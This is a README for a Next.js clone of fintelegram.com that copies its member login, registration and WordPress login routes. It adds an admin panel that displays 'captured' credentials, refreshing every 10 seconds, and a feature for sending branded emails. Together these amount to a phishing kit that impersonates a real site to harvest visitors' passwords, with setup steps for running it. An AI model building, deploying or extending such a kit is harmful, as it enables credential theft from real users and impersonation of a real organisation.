# FinTelegram Clone

A Next.js clone of [fintelegram.com](https://fintelegram.com/) with home, login, and register pages, plus an admin panel for credential management and email sending.

## Stack

- **Next.js 16** (App Router)
- **Supabase** (PostgreSQL)
- **Resend** (transactional email)

## Setup

### 1. Install dependencies

```bash
npm install
```

### 2. Configure environment

Copy `.env.local.example` to `.env.local` and fill in your values:

```bash
cp .env.local.example .env.local
```

| Variable | Description |
|---|---|
| `NEXT_PUBLIC_SUPABASE_URL` | Supabase project URL |
| `NEXT_PUBLIC_SUPABASE_ANON_KEY` | Supabase anon key |
| `SUPABASE_SERVICE_ROLE_KEY` | Supabase service role key (server-side only) |
| `ADMIN_PASSWORD` | Password for `/admin/login` |
| `ADMIN_SESSION_SECRET` | Random 32+ character secret for JWT sessions |
| `RESEND_API_KEY` | Resend API key |
| `RESEND_FROM_EMAIL` | Verified sender address in Resend |

### 3. Create database tables

Run the SQL in `supabase/schema.sql` in your Supabase SQL Editor.

### 4. Run the dev server

```bash
npm run dev
```

Open [http://localhost:3000](http://localhost:3000).

## Pages

| Route | Description |
|---|---|
| `/` | Home page (news layout) |
| `/login` | Member login (`/pms-login` on the real site) |
| `/register` | Membership registration (`/pms-register`) |
| `/wp-login` | WordPress admin login (`/wp-login.php` on the real site) |
| `/wp-admin` | Redirects to admin panel after login |
| `/admin/credentials` | View captured login/register credentials |
| `/admin/emails` | Send branded emails via Resend |

## Admin Panel

1. Go to `/wp-login` (or `/wp-login.php`)
2. Enter any username and your `ADMIN_PASSWORD`
3. After login you are redirected to `/wp-admin` → `/admin/credentials`

Credentials auto-refresh every 10 seconds on the credentials page.
